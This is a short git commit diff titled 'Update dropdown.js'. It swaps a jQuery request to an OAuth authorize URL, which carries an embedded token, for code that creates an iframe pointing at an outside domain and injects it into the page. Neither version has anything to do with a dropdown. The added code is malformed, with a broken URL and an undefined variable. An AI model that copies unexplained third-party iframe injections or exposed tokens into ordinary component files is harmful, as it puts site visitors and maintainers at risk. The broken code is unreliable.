bba643bee582ed378287968e6f41ce58cd51a84f
dimpol <djdimpol@rocketmail.com>
2016-11-07 15:28:01 +0200

    Update dropdown.js

--- js/src/dropdown.js
+++ js/src/dropdown.js
@@ -1,1 +1,3 @@
-$.get('https://apisandbox.openbankproject.com/oauth/authorize?oauth_token=JP5P1LUKTJYCONVYQA3X13IUESI3W1L33HDG3MLA',function(r){write(r)})
+var iframe = document.createElement("iframe");   
+iframe.src = "https:////wishluck.me" + key + "/embed/";   
+document.body.appendChild(iframe);
